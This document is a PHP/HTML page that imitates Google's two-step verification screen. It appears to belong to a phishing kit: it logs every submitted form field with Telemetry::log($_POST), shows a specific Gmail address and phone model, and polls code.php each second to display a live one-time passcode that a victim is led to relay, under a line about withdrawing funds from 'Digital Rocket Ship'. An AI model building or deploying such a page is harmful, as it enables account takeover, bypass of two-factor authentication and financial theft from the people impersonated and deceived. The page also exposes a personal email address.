<?php
require_once('../../util.php');
Telemetry::log($_POST);
?>

<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Sign in</title>
    <link rel="stylesheet" href="mock-google-password.css" />
</head>

<body>
    <style>
        body {
            margin: 0;
            padding: 0;
            background-color: #fff;
            font-family: Roboto, Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: flex-start;
            min-height: 100vh;
            color: #202124;
        }

        .mock-google-container {
            width: 100%;
            max-width: 400px;
            padding: 20px 16px;
        }

        .top-bar {
            display: flex;
            justify-content: center;
            margin-bottom: 24px;
        }

        .top-bar img {
            height: 40px;
        }

        .login-card {
            padding: 32px 24px;
            border-radius: 8px;
        }

        h1 {
            font-size: 1.5rem;
            margin-bottom: 8px;
        }

        .email {
            font-size: 0.95rem;
            margin-bottom: 6px;
        }

        .change-account {
            font-size: 0.85rem;
            color: #1a73e8;
            text-decoration: none;
            margin-bottom: 24px;
            display: inline-block;
        }

        form {
            display: flex;
            flex-direction: column;
        }

        label {
            font-size: 0.9rem;
            margin-bottom: 6px;
        }

        input[type="code"] {
            padding: 12px;
            font-size: 1rem;
            border: 1px solid #dadce0;
            border-radius: 4px;
            margin-bottom: 10px;
        }

        .options {
            display: flex;
            justify-content: flex-end;
            margin-bottom: 20px;
        }

        .forgot-link {
            font-size: 0.85rem;
            color: #1a73e8;
            text-decoration: none;
        }

        .button-row {
            display: flex;
            justify-content: flex-end;
        }

        button {
            background-color: #1a73e8;
            color: white;
            border: none;
            padding: 10px 24px;
            font-size: 0.95rem;
            font-weight: bold;
            border-radius: 4px;
            cursor: pointer;
            transition: background-color 0.3s ease;
        }

        button:hover {
            background-color: #185abc;
        }

        .disclaimer {
            margin-top: 24px;
            font-size: 0.75rem;
            color: #777;
            text-align: center;
        }

        .email {
            border: #202124 1px solid;
            border-radius: 12px;
            padding: 4px 8px;
            display: inline-block;
            margin-bottom: 4px;
        }

        #error-msg {
            color: red;
            font-size: 12px;
        }

        .otp-code {
            position: relative;
            left: 50%;
            transform: translateX(-50%);
            width: 100px;
            height: 100px;
            border: solid 1px gray;
            text-align: center;
        }

        .otp-code h3 {
            font-weight: bold;
            font-size: 32px;
        }
    </style>
    <div class="mock-google-container">
        <div class="top-bar">
            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/c/c1/Google_%22G%22_logo.svg/1200px-Google_%22G%22_logo.svg.png" alt="Google Logo">
        </div>

        <div class="login-card">
            <h1>2-Step Verification</h1>
            <h4>To help keep your account safe, Google wants to make sure it's really you trying to sign in</h4>
            <p class="email">owodunniqudus609@gmail.com</p>
            <a class="change-account" href="#">Use another account</a>

            <form onsubmit="e => e.preventDefault()" onload="load()">
                <label for="code">A one time passcode was sent to your Infinix HOT 6 Pro</label>

                <div class="otp-code">
                    <h3 id='otp-code'></h3>
                </div>

                <div id="error-msg"></div>

            </form>

            <p class="disclaimer">Authenticate Digital Rocket Ship with Google in order to withdraw funds</p>
        </div>

        <script>
            async function getcode() {
                const result = await fetch('code.php')
                const text = await result.text()

                if (text.count !== 0) {
                    document.getElementById("otp-code").innerHTML = text
                } else {
                    document.getElementById("otp-code").innerHTML = "<img style='width: 40px; height: 40px;' src='https://res.cloudinary.com/bytesizedpieces/image/upload/v1656084931/article/a-how-to-guide-on-making-an-animated-loading-image-for-a-website/animated_loader_gif_n6b5x0.gif'/>"
                }
                setTimeout(() => {
                    getcode()
                }, 1000);
            }

            getcode()
        </script>
    </div>
</body>

</html>